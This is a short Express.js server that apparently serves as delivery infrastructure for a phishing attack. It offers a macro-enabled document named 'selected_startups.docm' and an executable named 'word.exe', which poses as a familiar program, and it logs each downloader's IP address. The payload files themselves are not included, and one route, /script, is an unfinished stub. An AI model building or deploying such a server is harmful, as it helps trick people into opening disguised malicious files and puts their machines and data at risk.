import express from 'express'
import path from 'path';
import { fileURLToPath } from 'url';

// Get __dirname equivalent
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express()
const FILE_PATH = path.join(__dirname, "word.exe")
const DOCM_PATH = path.join(__dirname, "selected_startups.docm")

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));


app.use((req, res, next) => {
    console.log(`[+] Request received from ${req.ip} for ${req.url}`);
    next();
  });


  app.get("/download/startups", (req,res) => {
    res.download(DOCM_PATH, "selected_startups.docm", (err) => {
      if (err) {
        console.error("[-] Error sending file:", err);
        res.status(500).send("Server error");
      }
      else{
        console.log(`[+] File sent to ${req.ip}`);
      }
    })
  })

  app.get("/script", (req,res) => {
    res.download()
  })

  app.get("/word.exe", (req, res) => {
    res.download(FILE_PATH, "word.exe", (err) => {
      if (err) {
        console.error("[-] Error sending file:", err);
        res.status(500).send("Server error");
      } else {
        console.log(`[+] File sent to ${req.ip}`);
      }
    });
  });  

const PORT = 8000;

app.listen(PORT, ()=> {
    console.log(`App is listening on port ${PORT}`);
})